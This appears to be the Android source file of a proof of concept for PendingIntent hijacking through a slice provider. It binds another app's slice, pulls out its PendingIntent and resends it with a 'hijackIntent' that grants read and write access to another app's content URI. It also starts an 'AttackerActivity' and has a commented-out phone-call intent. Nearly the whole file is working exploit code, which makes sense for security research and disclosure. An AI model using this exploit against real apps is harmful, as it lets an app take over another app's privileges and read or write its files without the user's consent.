package com.sunny.slice;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.FileProvider;

import android.app.PendingIntent;
import android.app.slice.Slice;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.widget.Button;

import java.io.File;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

//    public static final String uriSettingsSlices = "content://com.sunny.slice.provider";
    public static final String uriSettingsSlices = "content://com.example.android.slice/wifi";

    private Button mBtnBind;
    private Button mBtnStart;
    private WebView mWebview;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mBtnBind = findViewById(R.id.btn_bindslice);
        mBtnStart = findViewById(R.id.btn_start);
        mWebview = findViewById(R.id.webview);
        mBtnStart.setOnClickListener(this);
        mBtnBind.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.btn_start:
                startActivity(new Intent(this, AttackerActivity.class));
                break;
            case R.id.btn_bindslice:
                bindSliceProvider();
                break;
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.P)
    private void bindSliceProvider() {
        Bundle b = new Bundle();
        b.putParcelable("slice_uri", Uri.parse(uriSettingsSlices));
        Bundle responseBundle = getContentResolver().call(Uri.parse(uriSettingsSlices), "bind_slice", null, b);

        System.out.println(responseBundle);
        for (String key : responseBundle.keySet()) {
            Log.i("Bundle Content", "Key=" + key + ", content:\n" + responseBundle.getParcelable(key));
        }
        Slice slice = responseBundle.getParcelable("slice");
        if (slice == null) return;
        Slice temp1 = slice.getItems().get(0).getSlice();
        Slice temp2 = temp1.getItems().get(3).getSlice();
        PendingIntent pi = (PendingIntent) temp2.getItems().get(1).getAction();
        if (pi != null) Log.d("sunny", "OK");

        Intent hijackIntent = new Intent();
        hijackIntent.setPackage(getPackageName());
//        hijackIntent.setClass(getApplicationContext(),WebViewActivity.class);
        hijackIntent.setDataAndType(Uri.parse("content://com.example.android.snippets/my_cache/test.html"), "text/html");
//        hijackIntent.setData(FileProvider.getUriForFile(getApplicationContext(),"com.example.android.snippets",
//                new File(MainActivity.this.getCacheDir()+File.separator+"test.html")));
//        hijackIntent.setType("text/html");
        hijackIntent.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION);
        Log.i("sunny","授权成功");
//         Intent hijackIntent = new Intent(Intent.ACTION_CALL,Uri.parse("tel:10086"));

        assert pi != null;
        try {
            pi.send(getApplicationContext(), 0, hijackIntent, null, null);
        } catch (PendingIntent.CanceledException e) {
            e.printStackTrace();
        }
    }

    public void loadData(View view) {
        mWebview.loadUrl("content://com.example.android.snippets/my_cache/test.html");
    }
}